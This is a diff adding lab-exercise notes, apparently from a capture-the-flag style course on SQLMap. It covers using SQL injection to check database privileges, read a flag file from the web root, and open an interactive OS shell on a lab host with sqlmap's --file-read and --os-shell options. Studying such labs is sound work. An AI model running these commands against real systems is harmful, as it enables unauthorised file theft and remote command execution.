@@ -229,6 +229,35 @@ From this command:
 
 # OS Exploration
 
+SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.
+
+Questions
+
+1.`Try to use SQLMap to read the file "/var/www/html/flag.txt".`
+
+We first check if we can read the Database
+          
+    sqlmap -u 'http://SERVERIP:PORT/?id=1' --is-dba --batch
+
+The output returns `True` which means we can read and write in the Database.
+
+      sqlmap -u 'http://94.237.54.116:37269/?id=1'  -p 'id' --batch --file-read="/var/www/html/flag.txt"
+
+2.`Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.`
+
+      sqlmap -u 'http://94.237.54.116:37269/?id=1'  -p 'id' --batch --os-shell
+
+
+
+# Skills Assesment
+
+Questions
+
+1.`What's the contents of table final_flag? `
+
+
+
+
 
     
 
